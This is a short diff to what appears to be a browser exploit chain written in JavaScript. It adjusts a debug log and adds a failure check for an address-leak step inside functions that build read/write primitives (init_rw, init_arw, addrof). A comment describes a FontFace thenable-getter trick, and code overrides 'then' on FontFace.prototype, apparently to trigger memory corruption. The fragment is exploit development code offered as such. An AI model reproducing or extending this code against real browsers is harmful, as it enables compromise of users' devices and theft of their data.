@@ -893,7 +893,7 @@ async function init_rw() {
   // A resolves synchronously, firing the thenable check getter above
   const fonts = await document.fonts.load("1em a, b", "AB");
 
-  logger.debug(`fonts: ${fonts}`);
+  logger.debug(`fonts: ${fonts.length} loaded`);
 
   Object.defineProperty(FontFace.prototype, "then", {
     configurable: true,
@@ -1043,6 +1043,10 @@ async function init_arw(rw) {
 
     arw.leak_addr = rw.addrof(arw.leak);
     logger.debug(`arw_leak_addr: ${arw.leak_addr}`);
+
+    if (arw.leak_addr.lo === 0) {
+      throw new Error(`Bad arw_leak_addr, addrof(arw.leak) failed: ${arw.leak_addr} !!`);
+    }
 
     const dummy_view = new Uint32Array(1);
     const dummy_view_addr = rw.addrof(dummy_view);
